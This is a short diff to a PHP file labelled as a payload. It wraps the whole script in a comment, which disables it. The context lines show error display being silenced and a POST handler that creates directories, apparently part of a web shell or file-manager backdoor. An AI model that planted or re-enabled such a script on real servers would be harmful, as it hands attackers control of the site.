@@ -1,3 +1,4 @@
+/* PAYLOAD_START
 <?php
 // Silence all errors
 @ini_set('display_errors', 0);
@@ -547,3 +548,4 @@ if (isset($_POST['mkdir']) && isset($_POST['dirname'])) {
     </div>
 </body>
 </html>
+PAYLOAD_END */
